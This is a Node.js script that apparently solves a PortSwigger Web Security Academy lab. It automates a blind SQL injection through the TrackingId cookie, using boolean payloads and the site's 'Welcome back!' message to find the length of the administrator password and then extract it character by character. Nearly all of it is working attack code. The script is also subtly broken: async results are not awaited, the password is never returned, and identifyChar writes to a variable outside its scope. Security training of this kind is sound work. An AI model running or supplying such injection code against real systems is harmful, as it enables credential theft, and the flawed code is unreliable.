const { parseCookie, findCookieByKey, cookiesToString } = require("./cookie")
const fs = require("fs/promises")

const cache_path = "cache.txt"

// this url constantly changes, you need to click on "Acess the lab" in order to generate a new tab, and copy-paste its url here
const url = "https://0a3e00d503f0f6068344821000ff00ef.web-security-academy.net/"
let session = null
let tracking_id = null

let request = {
    "headers": {
        "Cookie": null
    }
}

let body = null

console.log("Starting Proxy")

async function proxy() {
    const cache = await fs.readFile(cache_path).then((value) => value.toString().split("\n"))

    if(cache.length == 2) {
        session = cache[0]
        tracking_id = cache[1]

        request.headers.Cookie = "TrackingId=" + tracking_id + "; session=" + session

        console.log(request.headers.Cookie)
    }

    let data = await fetch(url, (cache.length == 1 ? undefined : request))

    if(!data.ok) {
        console.error("Failed to fetch: %d, %s", data.status, data.statusText)

        return
    }

    if(data.headers.get("set-cookie") != null) {
        const cookies = parseCookie(data.headers.get("set-cookie"))

        let tracking_id_cookie = findCookieByKey(cookies, "TrackingId")

        if(tracking_id_cookie != null)
            tracking_id = tracking_id_cookie.value

        session = findCookieByKey(cookies, "session").value

        request.headers.Cookie = "TrackingId=" + tracking_id + "; session=" + session

        await fs.writeFile(cache_path, session + "\n" + tracking_id)

        console.log("Session changed:", request.headers.Cookie)
    }

    data = await fetch(url, (cache.length == 1 ? undefined : request))

    if(!await hasWelcomeBack(data)) {
        console.error("Welcome Back not displayed")

        console.log(data.headers)

        return
    }

    const password_length = calculateLength()
    //const password_length = 20

    const password = await searchPassword(password_length)

    console.log(password)
}

proxy()

async function calculateLength() {
    let data = null

    for(length = 1; true; length += 2) {
        request.headers.Cookie = "TrackingId=" + tracking_id + "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > " + length + ") = 'a; session=" + session

        console.log(request.headers.Cookie)

        data = await fetch(url, request)

        if(!await hasWelcomeBack(data)) {
            request.headers.Cookie = "TrackingId=" + tracking_id + "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) = " + length + ") = 'a; session=" + session
            
            data = await fetch(url, request)

            return (await hasWelcomeBack(data) ? length : length - 1)
        }
    }
}

/**
 * @param {number} length 
 * @returns {string}
 */
async function searchPassword(length) {
    let password = ""

    for(char_index = 1; char_index <= length; ++char_index) {
        console.log("Character", char_index)

        request.headers.Cookie = "TrackingId=" + tracking_id + "' AND (SELECT SUBSTRING(password, " + char_index + ", 1) FROM users WHERE username='administrator') < 'a; session=" + session

        let data = await fetch(url, request)

        await identifyChar(char_index, (await hasWelcomeBack(data) ? "0123456789" : "abcdefghijklmnopqrstuvwxyz"))
    }
}

async function identifyChar(char_index, string) {
    const array = string.split("")

    for(index = 1; index < array.length; index += 2) {
        request.headers.Cookie = "TrackingId=" + tracking_id + "' AND (SELECT SUBSTRING(password, " + char_index + ", 1) FROM users WHERE username='administrator') > '" + array[index] + "; session=" + session

        console.log(request.headers.Cookie)

        data = await fetch(url, request)

        if(!await hasWelcomeBack(data)) {
            request.headers.Cookie = "TrackingId=" + tracking_id + "' AND (SELECT SUBSTRING(password, " + char_index + ", 1) FROM users WHERE username='administrator') = '" + array[index] + "; session=" + session
            
            data = await fetch(url, request)

            password += array[await hasWelcomeBack(data) ? index : index - 1]

            console.log(password)

            return
        }
    }

    password += array[array.length - 1]
}

async function hasWelcomeBack(data) {
    body = await data.text()
    return body.includes("Welcome back!")
}